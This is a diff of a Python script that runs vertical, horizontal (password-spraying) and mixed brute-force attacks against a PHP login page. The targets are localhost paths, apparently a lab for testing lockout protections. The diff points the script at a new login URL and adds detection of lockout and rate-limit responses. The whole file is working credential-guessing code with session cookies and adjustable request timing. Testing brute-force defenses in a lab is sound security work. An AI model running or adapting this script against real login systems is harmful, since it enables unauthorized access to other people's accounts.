@@ -2,9 +2,8 @@ import requests
 from bs4 import BeautifulSoup
 import time
 
-# URLs for login and authentication
-LOGIN_URL = 'http://localhost/bruteauth/login.php'
-AUTH_URL = 'http://localhost/bruteauth/authenticate.php'
+# URL for login
+LOGIN_URL = 'http://localhost/blockbruteforce/login.php'
 
 # Load username and password lists
 try:
@@ -41,42 +40,66 @@ def attempt_login(session, username, password):
     }
 
     # Perform the login request
-    response = session.post(AUTH_URL, data=login_data, headers=headers, allow_redirects=False)
+    response = session.post(LOGIN_URL, data=login_data, headers=headers, allow_redirects=False)
 
-    # Handle redirects
-    if response.status_code == 302:
-        print(f"Redirected to: {response.headers.get('Location')}")
-        return True, response  # Login successful, redirection occurred
+    # Check if the account is locked or too many attempts
+    if response.status_code == 403:
+        if "Account temporarily locked" in response.text:
+            print(f"[BLOCKED] Account locked for username: {username}.")
+            return False, response
+        elif "too many attempts" in response.text:
+            print(f"[BLOCKED] Brute-force prevention triggered for username: {username}.")
+            return False, response
 
-    return "Login successful!" in response.text, response  # Adjust based on your app's success message
+    # Check for successful login (by checking for the redirect to dashboard)
+    if response.status_code == 302 and "Location" in response.headers and response.headers["Location"] == "dashboard.php":
+        print(f"[SUCCESS] Login successful for Username: {username}, Password: {password}")
+        return True, response
+
+    # If the credentials are invalid
+    if "Invalid credentials" in response.text:
+        print(f"[FAIL] Invalid credentials for {username}. Password: {password}")
+        return False, response
+
+    print(f"[INFO] Response: {response.status_code}, {response.text}")
+    return False, response
 
 # Define color codes
 GREEN = "\033[32m"
-RESET = "\033[0m"  # Reset to default color
+RED = "\033[31m"
+RESET = "\033[0m"
 
 def vertical_brute_force(single_username, sleep_time):
     """Perform vertical brute-force attack for a single user."""
+    failed_attempts = 0
+
     with requests.Session() as session:
-        # Load cookie into the session
-        session.cookies.update(load_cookie())
+        session.cookies.update(load_cookie())  # Load cookie into session
 
         for password in passwords:
             success, response = attempt_login(session, single_username, password)
 
             if success:
                 print(f"{GREEN}[SUCCESS]{RESET} Username: {single_username}, Password: {password}")
-                return  # Exit after a successful login
+                return
             elif "Invalid credentials" in response.text:
                 print(f"[FAIL] Password: {password}")
+                failed_attempts += 1
             else:
-                print(f"[ERROR] Unexpected response for Password: {password}")
+                print(f"[INFO] Password: {password}, Response: {response.status_code}")
 
-            time.sleep(sleep_time)  # Customizable sleep time
+            # Stop if brute-force protection activates
+            if response.status_code == 403 or "too many attempts" in response.text.lower():
+                print(f"{RED}[BLOCKED]{RESET} Brute-force prevention detected after {failed_attempts} attempts.")
+                break
+
+            time.sleep(sleep_time)
 
 def horizontal_attack(sleep_time):
     """Perform horizontal brute-force attack (one password across all users)."""
+    failed_attempts = 0
+
     with requests.Session() as session:
-        # Load cookie into the session
         session.cookies.update(load_cookie())
 
         for password in passwords:
@@ -87,40 +110,47 @@ def horizontal_attack(sleep_time):
 
                 if success:
                     print(f"{GREEN}[SUCCESS]{RESET} Username: {username}, Password: {password}")
-                    break  # Exit the loop as soon as the correct password is found
+                    return
                 elif "Invalid credentials" in response.text:
                     print(f"[FAIL] Username: {username}, Password: {password}")
+                    failed_attempts += 1
                 else:
-                    print(f"[ERROR] Unexpected response for Username: {username}, Password: {password}")
+                    print(f"[INFO] Response: {response.status_code}")
 
-                time.sleep(sleep_time)  # Customizable sleep time
+                if response.status_code == 403 or "too many attempts" in response.text.lower():
+                    print(f"{RED}[BLOCKED]{RESET} Brute-force prevention detected after {failed_attempts} attempts.")
+                    return
 
+                time.sleep(sleep_time)
 
 def mixed_attack(sleep_time):
-    """Perform mixed brute-force attack (all passwords for one user at a time)."""
+    """Perform mixed brute-force attack."""
     with requests.Session() as session:
-        # Load cookie into the session
         session.cookies.update(load_cookie())
 
         for username in usernames:
-            print(f"Attempting passwords for Username: {username}")
+            print(f"Testing passwords for Username: {username}")
+            failed_attempts = 0
 
             for password in passwords:
                 success, response = attempt_login(session, username, password)
 
                 if success:
                     print(f"{GREEN}[SUCCESS]{RESET} Username: {username}, Password: {password}")
-                    break  # Break the inner loop as soon as the correct password is found
+                    return
                 elif "Invalid credentials" in response.text:
                     print(f"[FAIL] Username: {username}, Password: {password}")
+                    failed_attempts += 1
                 else:
-                    print(f"[ERROR] Unexpected response for Username: {username}, Password: {password}")
+                    print(f"[INFO] Response: {response.status_code}")
 
-                time.sleep(sleep_time)  # Customizable sleep time
+                if response.status_code == 403 or "too many attempts" in response.text.lower():
+                    print(f"{RED}[BLOCKED]{RESET} Brute-force prevention triggered after {failed_attempts} attempts.")
+                    break
 
-            print(f"Finished trying passwords for Username: {username}")
+                time.sleep(sleep_time)
 
-# Choose the attack type
+# Choose attack type
 try:
     sleep_time = float(input("Enter sleep time between requests (in seconds, e.g., 1.5): "))
 except ValueError:
@@ -132,10 +162,10 @@ choice = input("Enter choice (1, 2, or 3): ")
 
 if choice == "1":
     target_username = input("Enter the username for vertical brute-force: ")
-    vertical_brute_force(target_username, sleep_time)  # Calls vertical attack function
+    vertical_brute_force(target_username, sleep_time)
 elif choice == "2":
-    horizontal_attack(sleep_time)  # Calls horizontal attack function
+    horizontal_attack(sleep_time)
 elif choice == "3":
-    mixed_attack(sleep_time)  # Calls mixed attack function
+    mixed_attack(sleep_time)
 else:
     print("Invalid choice.")
